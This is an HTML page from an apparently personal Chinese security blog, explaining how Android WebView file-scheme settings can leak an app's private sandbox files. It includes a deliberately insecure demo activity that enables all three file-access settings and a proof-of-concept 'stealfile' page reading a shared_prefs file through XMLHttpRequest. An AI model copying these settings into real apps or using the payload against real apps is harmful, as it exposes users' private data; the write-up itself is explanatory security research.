@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="android, Webview,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WebView File域信息泄漏(一)写在了前面最近发现了一系列由于使用WebView打开File域导致一些APP隐私文件泄漏的问题。本身这个问题已经算是一个远古的问题了，不过既然出现了，还是整理了一下网上的一些资料，写了两个小Demo，记录下这种漏洞的流程与常见的解决方案。 必备条件说明(TL;DR)一般关于WebView问题需要关注一下几个点：  加载使用WebView的组件是否为导出组件，">
+<meta name="keywords" content="android, Webview">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebView File域信息泄漏(一)">
+<meta property="og:url" content="http://N1rv0us@github.io/2019/11/11/WebView-File域信息泄漏-一/index.html">
+<meta property="og:site_name" content="失眠想睡觉的blog">
+<meta property="og:description" content="WebView File域信息泄漏(一)写在了前面最近发现了一系列由于使用WebView打开File域导致一些APP隐私文件泄漏的问题。本身这个问题已经算是一个远古的问题了，不过既然出现了，还是整理了一下网上的一些资料，写了两个小Demo，记录下这种漏洞的流程与常见的解决方案。 必备条件说明(TL;DR)一般关于WebView问题需要关注一下几个点：  加载使用WebView的组件是否为导出组件，">
+<meta property="og:locale" content="cn">
+<meta property="og:updated_time" content="2019-11-11T03:14:24.626Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WebView File域信息泄漏(一)">
+<meta name="twitter:description" content="WebView File域信息泄漏(一)写在了前面最近发现了一系列由于使用WebView打开File域导致一些APP隐私文件泄漏的问题。本身这个问题已经算是一个远古的问题了，不过既然出现了，还是整理了一下网上的一些资料，写了两个小Demo，记录下这种漏洞的流程与常见的解决方案。 必备条件说明(TL;DR)一般关于WebView问题需要关注一下几个点：  加载使用WebView的组件是否为导出组件，">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://N1rv0us@github.io/2019/11/11/WebView-File域信息泄漏-一/">
+
+
+
+
+
+  <title>WebView File域信息泄漏(一) | 失眠想睡觉的blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">失眠想睡觉的blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://N1rv0us@github.io/2019/11/11/WebView-File域信息泄漏-一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N1rv0us">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="失眠想睡觉的blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WebView File域信息泄漏(一)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-11T10:18:25+08:00">
+                2019-11-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="WebView-File域信息泄漏-一"><a href="#WebView-File域信息泄漏-一" class="headerlink" title="WebView File域信息泄漏(一)"></a>WebView File域信息泄漏(一)</h1><h2 id="写在了前面"><a href="#写在了前面" class="headerlink" title="写在了前面"></a>写在了前面</h2><p>最近发现了一系列由于使用WebView打开File域导致一些APP隐私文件泄漏的问题。本身这个问题已经算是一个远古的问题了，不过既然出现了，还是整理了一下网上的一些资料，写了两个小Demo，记录下这种漏洞的流程与常见的解决方案。</p>
+<h2 id="必备条件说明-TL-DR"><a href="#必备条件说明-TL-DR" class="headerlink" title="必备条件说明(TL;DR)"></a>必备条件说明(TL;DR)</h2><p>一般关于WebView问题需要关注一下几个点：</p>
+<ul>
+<li>加载使用WebView的组件是否为导出组件，是否对传入的URL严格的校验，对于有校验的是否可以绕过；这类问题可能导致攻击者控制APP打开制定的网站；</li>
+<li>WebView是否开启了setJavaScriptEnabled,开启以后其导出的JSAPI会不会导致一些危险函数的暴露；这类问题可能导致攻击者通过构造攻击页面，强迫APP打开该网页以后，利用暴露的JSAPI功能达到一些特定的目的；</li>
+<li>判断WebView是否开启了File域，以及查看setAllowFileAccess，AllowFileAccessFromFileURLs，AllowUniversalAccessFromFileURL三个Setting的状态；这类问题可能导致攻击者获取到一些APP沙箱中的信息</li>
+</ul>
+<p>下面将讨论WebView关于File域的三个Setting，总结在每种情况下的攻击方式：</p>
+<h3 id="setAllowFileAccess"><a href="#setAllowFileAccess" class="headerlink" title="setAllowFileAccess"></a>setAllowFileAccess</h3><p>下面是关于setAllowFileAccess的一些官方说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enables or disables file access within WebView. File access is enabled by default. Note that this enables or disables file system access only. Assets and resources are still accessible using file:///android_asset and file:///android_res.</span><br></pre></td></tr></table></figure>
+
+<p>这是一项默认开启的设置，当开启此设置的时候，将允许WebView加载File域下的文件(file://)。</p>
+<h3 id="setFileAccessFromFileURLs"><a href="#setFileAccessFromFileURLs" class="headerlink" title="setFileAccessFromFileURLs"></a>setFileAccessFromFileURLs</h3><p>下面是关于setFileAccessFromFileURLs的一些官方说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sets whether JavaScript running in the context of a file scheme URL should be allowed to access content from other file scheme URLs. To enable the most restrictive, and therefore secure policy, this setting should be disabled. Note that the value of this setting is ignored if the value of getAllowUniversalAccessFromFileURLs() is true. Note too, that this setting affects only JavaScript access to file scheme resources. Other access to such resources, for example, from image HTML elements, is unaffected. To prevent possible violation of same domain policy on ICE_CREAM_SANDWICH and earlier devices, you should explicitly set this value to false.The default value is true for API level ICE_CREAM_SANDWICH_MR1 and below, and false for API level JELLY_BEAN and above.</span><br></pre></td></tr></table></figure>
+
+<p>本设置在Android 4.1版本默认值为False，如果开启了此设置将允许file url加载的JavaScript读取其他的本地文件。</p>
+<h3 id="setAllowUniversalAccessFromFileURLs"><a href="#setAllowUniversalAccessFromFileURLs" class="headerlink" title="setAllowUniversalAccessFromFileURLs"></a>setAllowUniversalAccessFromFileURLs</h3><p>通过此 API 可以设置是否允许通过 file url 加载的 Javascript 可以访问其他的源，包括其他的文件和 http，https 等其他的源。本设置在Android 4.1以后的版本默认为False。当此设置为True的时候，将无视setFileAccessFromFileURLs的状态；</p>
+<h2 id="攻击利用方式"><a href="#攻击利用方式" class="headerlink" title="攻击利用方式"></a>攻击利用方式</h2><p>WebView中关于File 域名的设置主要包括这三个 :</p>
+<ul>
+<li>setAllowFileAccess(true)</li>
+<li>setFileAccessFromFileURLs(false)</li>
+<li>setAllowUniversalAccessFromFileURLs(false)</li>
+</ul>
+<p>这种设置方式允许了WebView加载File域下的文件，但是限制了其中Javascript的功能，相对较安全，在本节中将说明上面着三个设置全部开启时候的攻击利用方式。在后续文章中将讨论默认开启状况下的攻击方式，以及安全的开发方式。</p>
+<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>为了方便观看，只写了一个MainActivity，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> WebView mWebview;</span><br><span class="line">    <span class="keyword">private</span> Uri mUri;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    String mUrl = <span class="string">"file:////data/local/tmp/attack.html"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressLint</span>(<span class="string">"JavascriptInterface"</span>)</span><br><span class="line">    <span class="meta">@RequiresApi</span>(api = Build.VERSION_CODES.JELLY_BEAN)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mWebview = (WebView)findViewById(R.id.webview);</span><br><span class="line">        mWebview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        mWebview.addJavascriptInterface(<span class="keyword">new</span> JSBridge(),<span class="string">"WE"</span>);</span><br><span class="line"></span><br><span class="line">        mWebview.getSettings().setAllowFileAccess(<span class="keyword">true</span>);</span><br><span class="line">        mWebview.getSettings().setAllowFileAccessFromFileURLs(<span class="keyword">true</span>);</span><br><span class="line">        mWebview.getSettings().setAllowUniversalAccessFromFileURLs(<span class="keyword">true</span>);</span><br><span class="line">        mWebview.setWebChromeClient(<span class="keyword">new</span> WebChromeClient()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsAlert</span><span class="params">(WebView view, String url, String message, JsResult result)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.onJsAlert(view, url, message, result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        mWebview.loadUrl(mUrl1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">JSBridge</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">onButtonClick</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">final</span> String str = text;</span><br><span class="line">            runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    Log.e(<span class="string">"mWebView"</span>,<span class="string">"onButtonClick: text= "</span>+str);</span><br><span class="line">                    Toast.makeText(getApplicationContext(),<span class="string">"onButtonClick: text= "</span>+str,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"This text is returned from Java layer. js text = "</span>+text;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onImageClick</span><span class="params">(String url, <span class="keyword">int</span> width, <span class="keyword">int</span> height )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">final</span> String str = <span class="string">"onImageClick: text= "</span>+url+<span class="string">" width = "</span>+width+<span class="string">" height = "</span>+height;</span><br><span class="line">            Log.e(<span class="string">"mWebView"</span>,str);</span><br><span class="line">            runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    Toast.makeText(getApplicationContext(),str,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加载的HTML代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">            function stealfile() &#123;</span><br><span class="line">                var file="file:///data/data/com.example.webviewdemo/shared_prefs/WebViewChromiumPrefs.xml";</span><br><span class="line">                var xmlHttpReq = new XMLHttpRequest();</span><br><span class="line">                xmlHttpReq.onreadystatechange = function() &#123;</span><br><span class="line">                    if (xmlHttpReq.readyState == 4) &#123;</span><br><span class="line">                        if (xmlHttpReq.responseText.length &lt; 1) &#123;</span><br><span class="line">                            alert(file);</span><br><span class="line">                            stealfile();</span><br><span class="line">                        &#125; else&#123;</span><br><span class="line">                            alert(xmlHttpReq.responseText);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                xmlHttpReq.open("GET",file);</span><br><span class="line">                xmlHttpReq.send(null);</span><br><span class="line">            &#125;</span><br><span class="line">            setTimeout(stealfile,6000);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于File域的设置，导致了加载的本地文件也可以加载JavaScript读取本地文件。该攻击页面就是利用这个功能让APP去加载沙箱中的私有文件，造成了文件的泄漏。在上面的Demo中只是使用了Alert将内容展示了出来，实际上利用XMLHttpRequest我们可以将里面的内容发送到攻击者配置好的服务器中，造成进一步的危害</p>
+<h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p>[掘金] 关于WebView的详细整理</p>
+<p><a href="https://juejin.im/post/58a037df86b599006b3fade4#heading-7" target="_blank" rel="noopener">https://juejin.im/post/58a037df86b599006b3fade4#heading-7</a></p>
+<p>[腾讯御安全] Android安全开发 WebView中的地雷</p>
+<p><a href="https://yaq.qq.com/blog/detail/130.html" target="_blank" rel="noopener">https://yaq.qq.com/blog/detail/130.html</a></p>
+<p>[CSDN] WebView File域同源策略绕过漏洞</p>
+<p><a href="https://blog.csdn.net/u010651541/article/details/54286901" target="_blank" rel="noopener">https://blog.csdn.net/u010651541/article/details/54286901</a></p>
+<p>[博客园] WebView File域同源策略绕过漏洞浅析</p>
+<p><a href="https://www.cnblogs.com/zhchoutai/p/8796908.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhchoutai/p/8796908.html</a>    </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/android-Webview/" rel="tag"># android, Webview</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/08/how2heap-fastbin-dup/" rel="next" title="how2heap-fastbin_dup">
+                <i class="fa fa-chevron-left"></i> how2heap-fastbin_dup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/11/WebView-File域信息泄漏-二/" rel="prev" title="WebView File域信息泄漏(二)">
+                WebView File域信息泄漏(二) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">N1rv0us</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebView-File域信息泄漏-一"><span class="nav-number">1.</span> <span class="nav-text">WebView File域信息泄漏(一)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在了前面"><span class="nav-number">1.1.</span> <span class="nav-text">写在了前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#必备条件说明-TL-DR"><span class="nav-number">1.2.</span> <span class="nav-text">必备条件说明(TL;DR)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#setAllowFileAccess"><span class="nav-number">1.2.1.</span> <span class="nav-text">setAllowFileAccess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#setFileAccessFromFileURLs"><span class="nav-number">1.2.2.</span> <span class="nav-text">setFileAccessFromFileURLs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#setAllowUniversalAccessFromFileURLs"><span class="nav-number">1.2.3.</span> <span class="nav-text">setAllowUniversalAccessFromFileURLs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击利用方式"><span class="nav-number">1.3.</span> <span class="nav-text">攻击利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo"><span class="nav-number">1.3.1.</span> <span class="nav-text">Demo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REFERENCE"><span class="nav-number">1.4.</span> <span class="nav-text">REFERENCE</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N1rv0us</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
